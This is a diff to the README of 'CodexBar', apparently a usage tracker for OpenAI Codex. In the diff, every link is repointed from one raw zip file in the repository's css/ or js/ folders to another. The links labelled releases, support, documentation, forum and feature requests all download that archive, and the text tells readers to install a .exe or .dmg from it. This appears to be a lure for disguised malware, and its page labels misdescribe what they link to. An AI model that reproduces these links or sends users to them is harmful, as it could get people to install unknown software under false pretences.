@@ -1,6 +1,6 @@
 # 🚀 CodexBar - Track Your OpenAI Codex Usage Easily
 
-![Download CodexBar](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip%20CodexBar-v1.0-brightgreen)
+![Download CodexBar](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip%20CodexBar-v1.0-brightgreen)
 
 ## 📜 About CodexBar
 
@@ -19,7 +19,7 @@ CodexBar helps you track usage stats for OpenAI Codex. With this tool, you can v
 To get started with CodexBar, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip) to find the latest version of CodexBar.
+   Go to our [Releases page](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip) to find the latest version of CodexBar.
 
 2. **Download the Application**  
    On the Releases page, you will see a list of available versions. Click on the version you want to download.
@@ -29,7 +29,7 @@ To get started with CodexBar, follow these simple steps:
    - For macOS, select the `.dmg` file.
    - For Windows, select the `.exe` file.
 
-   ![Download File Options](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip)
+   ![Download File Options](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip)
 
 4. **Install CodexBar**  
    After downloading, locate the file in your Downloads folder.  
@@ -41,7 +41,7 @@ To get started with CodexBar, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download CodexBar, visit this page: [CodexBar Releases](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip). Select your operating system, choose the appropriate file, and install it by following the steps provided above.
+To download CodexBar, visit this page: [CodexBar Releases](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip). Select your operating system, choose the appropriate file, and install it by following the steps provided above.
 
 ## 📊 Features
 
@@ -52,13 +52,13 @@ To download CodexBar, visit this page: [CodexBar Releases](https://raw.githubuse
 
 ## 🌐 Support & Feedback
 
-If you have questions or need assistance, please visit our [Support Page](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip). We appreciate feedback to improve CodexBar further.
+If you have questions or need assistance, please visit our [Support Page](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip). We appreciate feedback to improve CodexBar further.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For detailed instructions, visit our comprehensive [Documentation](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip).
-- **Community Forum:** Engage with other users on our [Community Forum](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip).
-- **Feature Requests:** Want to see a new feature? Submit your suggestions via our [Feature Requests page](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/css/CodexBar-v2.6.zip).
+- **Documentation:** For detailed instructions, visit our comprehensive [Documentation](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip).
+- **Community Forum:** Engage with other users on our [Community Forum](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip).
+- **Feature Requests:** Want to see a new feature? Submit your suggestions via our [Feature Requests page](https://raw.githubusercontent.com/mohamed-magdy-1/CodexBar/main/js/Codex-Bar-Bob.zip).
 
 ---
 
